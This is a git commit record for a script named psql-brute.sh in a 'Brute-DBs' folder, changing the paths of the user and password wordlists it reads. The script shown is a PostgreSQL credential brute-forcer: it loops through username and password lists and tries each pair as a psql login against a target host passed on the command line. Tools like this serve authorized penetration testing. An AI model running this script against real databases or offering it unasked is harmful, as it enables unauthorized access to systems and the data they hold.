39a4c741ab7b88079a805c513f23f8fc6beba5d3
Rafael Baldasso <77108325+rafaelbaldasso@users.noreply.github.com>
2024-02-21 18:22:53 -0300

    Update psql-brute.sh

--- Brute-DBs/psql-brute.sh
+++ Brute-DBs/psql-brute.sh
@@ -4,8 +4,8 @@ if [ "$1" == "" ]
         then
                 echo;echo "[>] Usage: $0 <target>";echo
         else
-                for u in $(cat wordlists/psql-users.txt);do
-                        for p in $(cat wordlists/psql-pass.txt);do
+                for u in $(cat users.txt);do
+                        for p in $(cat pass.txt);do
                                 echo $u:$p
                                 psql postgresql://$u:$p@$1
                         done
